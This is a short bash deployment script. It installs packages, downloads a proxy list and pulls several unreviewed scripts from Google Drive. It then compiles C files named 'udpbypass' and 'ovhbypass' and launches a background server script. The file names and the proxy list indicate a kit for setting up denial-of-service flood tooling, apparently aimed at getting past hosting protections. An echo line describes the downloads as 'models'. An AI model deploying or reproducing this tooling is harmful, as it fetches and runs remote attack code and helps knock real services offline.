#!/bin/bash
echo "[+] Installing system packages..."
sudo apt-get update -y && sudo apt-get install -y python3-pip wget gcc nodejs npm
pip install gdown flask requests
npm install -g cluster colors axios discord.js user-agents puppeteer-real-browser

echo "[+] Downloading all required models..."
wget https://github.com/ErcinDedeoglu/proxies/raw/refs/heads/main/proxies/https.txt -O proxy.txt
gdown 1l7XemuQ4MuxYYzmzLYnXTF9tXw_mutgV -O hieu.js
gdown 1Kpe6qSbsNaS-z0f9BMCyJsi3ooVouPLh -O raw.js
gdown 1Nr_mkvx54ih7esfpFd8QheaVvGL8O2J6 -O vps.py
gdown 1MuaBraso20I73ixepu6SQWDq0GMnlU05 -O udpbypass.c
gdown 1Q2VYSvBdeclp6A1f8xePFrT6Yt7ZB2gX -O ovh.c

echo "[+] Compiling C source files..."
gcc udpbypass.c -o udpbypass && gcc ovh.c -o ovhbypass && chmod +x udpbypass ovhbypass

echo "[+] Starting main VPS server..."
if [ -f "vps.py" ]; then nohup python3 vps.py > vps.log 2>&1 &; fi
echo "✅ Deployment script finished."